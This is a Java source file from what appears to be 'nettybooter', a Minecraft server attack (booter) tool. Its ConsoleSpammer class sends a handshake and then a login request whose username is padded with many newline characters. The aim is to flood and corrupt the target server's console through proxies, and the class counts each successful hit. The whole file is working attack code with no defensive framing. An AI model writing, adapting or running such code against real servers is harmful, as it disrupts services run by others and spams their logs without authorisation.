package me.nzxtercode.nettybooter.methods.impl;

import java.security.SecureRandom;

import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import me.nzxtercode.nettybooter.methods.interfaces.IMethod;
import me.nzxtercode.nettybooter.packets.Handshake;
import me.nzxtercode.nettybooter.packets.LoginRequest;
import me.nzxtercode.nettybooter.proxy.Proxy;
import me.nzxtercode.nettybooter.utils.NettyBootstrap;

/**
 * The type Console spammer.
 */
public class ConsoleSpammer implements IMethod {

	private final Handshake handshake;

	public ConsoleSpammer(Handshake handshake) {
		this.handshake = handshake;
	}

	public void accept(Channel channel, Proxy proxy) {
		channel.writeAndFlush(Unpooled.buffer().writeBytes(handshake.getWrappedPacket()));
		channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest(new SecureRandom().nextInt(9) + "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n").getWrappedPacket())));
		NettyBootstrap.service.success++;
		channel.close();
	}
}
